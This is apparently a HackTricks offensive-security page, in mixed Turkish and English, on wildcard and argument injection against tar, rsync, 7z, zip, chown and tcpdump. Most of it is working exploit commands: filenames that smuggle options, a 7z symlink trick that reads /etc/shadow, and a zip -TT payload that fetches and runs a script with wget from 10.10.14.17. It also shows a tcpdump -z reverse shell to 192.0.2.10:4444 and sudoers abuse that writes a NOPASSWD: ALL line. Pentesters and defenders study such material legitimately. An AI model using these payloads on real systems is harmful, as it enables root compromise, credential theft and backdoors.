# Wildcards İçin Ek Hileler

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** happens when a privileged script runs a Unix binary such as `tar`, `chown`, `rsync`, `zip`, `7z`, … with an unquoted wildcard like `*`.
> Since the shell expands the wildcard **before** executing the binary, an attacker who can create files in the working directory can craft filenames that begin with `-` so they are interpreted as **options instead of data**, effectively smuggling arbitrary flags or even commands.
> This page collects the most useful primitives, recent research and modern detections for 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
root daha sonra şöyle bir şey çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` enjekte edilir; bu, *eşleşen tüm* dosyaların `/root/secret``file`'ın sahiplik/izinlerini miras almasına neden olur.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (birleştirilmiş saldırı).
Ayrıntılar için klasik DefenseCode makalesine bakın.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

İstediğiniz komutları çalıştırmak için **checkpoint** özelliğini kötüye kullanın:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` is executed as root.

### bsdtar / macOS 14+

Yeni macOS sürümlerindeki varsayılan `tar` (libarchive tabanlı) `--checkpoint`'i uygulamaz, ancak harici bir sıkıştırıcı belirtmenize olanak tanıyan **--use-compress-program** bayrağı ile yine de code-execution elde edebilirsiniz.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Yetkili bir script `tar -cf backup.tar *` çalıştırdığında, `/bin/sh` başlatılacaktır.

---

## rsync

`rsync`, uzak shell'i veya hatta uzak binary'yi `-e` veya `--rsync-path` ile başlayan komut satırı bayrakları aracılığıyla geçersiz kılmanıza izin verir:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Eğer root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen flag uzak tarafta shell'inizi spawn eder.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ayrıcalıklı betik *savunmacı olarak* wildcard'ı `--` ile (seçenek ayrıştırmayı durdurmak için) öneklediğinde bile, 7-Zip formatı dosya adını `@` ile önekleyerek **file list files** destekler. Bunu bir symlink ile birleştirmek size *exfiltrate arbitrary files* sağlar:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Eğer root şu gibi bir şeyi çalıştırıyorsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` (→ `/etc/shadow`) dosya listesi olarak okumaya çalışacak ve işlemden çıkacak, **içeriği stderr'e yazdırarak**.

---

## zip

Bir uygulama kullanıcı kontrollü dosya adlarını `zip`'e geçirirse (ya bir wildcard aracılığıyla ya da `--` olmadan isimleri sıralayarak) iki çok pratik temel yapı vardır.

- RCE via test hook: `-T` “test archive” özelliğini etkinleştirir ve `-TT <cmd>` tester'ı rastgele bir programla değiştirir (uzun biçimi: `--unzip-command <cmd>`). Eğer `-` ile başlayan dosya adları enjekte edebiliyorsanız, kısa-seçenek ayrıştırması çalışması için bayrakları ayrı dosya adlarına bölün:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notlar
- Tek bir dosya adıyla `'-T -TT <cmd>'` gibi denemeyin — kısa seçenekler karakter bazında ayrıştırılır ve bu başarısız olur. Gösterildiği gibi ayrı tokenler kullanın.
- Uygulama dosya adlarındaki eğik çizgileri kaldırıyorsa, çıplak bir host/IP'den (varsayılan yol `/index.html`) çekin ve `-O` ile yerel olarak kaydedin, sonra çalıştırın.
- Tokenlerinizin nasıl tüketildiğini anlamak için ayrıştırmayı `-sc` (işlenmiş argv'yi gösterir) veya `-h2` (daha fazla yardım) ile hata ayıklayabilirsiniz.

Örnek (zip 3.0'teki yerel davranış):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Eğer web layer `zip` stdout/stderr'i yansıtıyorsa (naive wrappers'da yaygın), enjekte edilmiş flag'ler (ör. `--help`) veya hatalı seçeneklerden kaynaklanan hatalar HTTP response içinde görünür; bu, command-line injection'ı doğrular ve payload ayarlamayı kolaylaştırır.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Aşağıdaki komutlar modern CTF'lerde ve gerçek ortamlarda kötüye kullanıldı. Payload her zaman daha sonra wildcard ile işlenecek yazılabilir bir dizin içinde bir *filename* olarak oluşturulur:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Dosya içeriğini okuma |
| `flock` | `-c <cmd>` | Komut çalıştırma |
| `git`   | `-c core.sshCommand=<cmd>` | git üzerinden SSH ile komut çalıştırma |
| `scp`   | `-S <cmd>` | ssh yerine rastgele bir program başlatma |

Bu primitifler *tar/rsync/zip* klasiklerinden daha az yaygındır ancak keşif yaparken kontrol etmeye değerdir.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Kısıtlı bir shell veya vendor wrapper, kullanıcı kontrollü alanları (ör. bir "file name" parametresi) sıkı tırnaklama/validasyon olmadan birleştirerek `tcpdump` komut satırı oluşturduğunda, ekstra `tcpdump` flag'lerini gizleyebilirsiniz. `-G` (time-based rotation), `-W` (limit number of files) ve `-z <cmd>` (post-rotate command) kombinasyonu, tcpdump'ı çalıştıran kullanıcı olarak (appliance'larda genellikle root) arbitrary command execution sağlar.

Preconditions:

- `argv`'nin `tcpdump`'a geçirilmesini etkileyebiliyorsunuz (ör. `/debug/tcpdump --filter=... --file-name=<HERE>` gibi bir wrapper üzerinden).
- Wrapper, file name alanında boşlukları veya `-`-prefixed token'leri temizlemiyor.

Klasik PoC (yazılabilir bir yoldan bir reverse shell script çalıştırır):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Ayrıntılar:

- `-G 1 -W 1` ilk eşleşen paketten sonra anında rotate işlemini zorlar.
- `-z <cmd>` her rotasyonda post-rotate komutunu bir kez çalıştırır. Birçok build `<cmd> <savefile>` çalıştırır. Eğer `<cmd>` bir script/interpreter ise, argüman işleme şeklinde payload'ınıza uygun olduğundan emin olun.

Çıkarılabilir medya olmayan varyantlar:

- Dosya yazmak için başka bir primitive'iniz varsa (ör. çıktı yönlendirmesine izin veren ayrı bir komut wrapper'ı), script'inizi bilinen bir yola koyun ve platform semantiğine bağlı olarak `-z /bin/sh /path/script.sh` veya `-z /path/script.sh` tetikleyin.
- Bazı vendor wrapper'lar döndürülen dosyaları saldırganın kontrol edebileceği konumlara kaydeder. Döndürülen yolu (symlink/directory traversal) etkileyebiliyorsanız, `-z`'yi tamamen kontrol ettiğiniz içeriği harici medya olmadan çalıştıracak şekilde yönlendirebilirsiniz.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Çok yaygın bir sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Issues
- `*` glob ve izin verici desenler yalnızca ilk `-w` argümanını sınırlar. `tcpdump` birden fazla `-w` seçeneğini kabul eder; en sonuncusu geçerli olur.
- Kural diğer seçenekleri sabitlemez, bu yüzden `-Z`, `-r`, `-V` vb. izinlidir.

Primitives
- Hedef yolunu ikinci bir `-w` ile geçersiz kılın (ilk sadece sudoers gereksinimini karşılar):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal ilk `-w` içinde kısıtlı dizin ağacından kaçmak için:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Çıktı sahipliğini zorla `-Z root` (herhangi bir yerde root sahipli dosyalar oluşturur):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` ile özel hazırlanmış bir PCAP'i yeniden oynatarak keyfi içerik yazma (ör., bir sudoers satırı bırakmak):

<details>
<summary>Tam ASCII payload'ını içeren bir PCAP oluşturun ve bunu root olarak yazın</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (savefiles listesini yorumlar). Hata tanıları genellikle satırları echo'lar, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referanslar

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
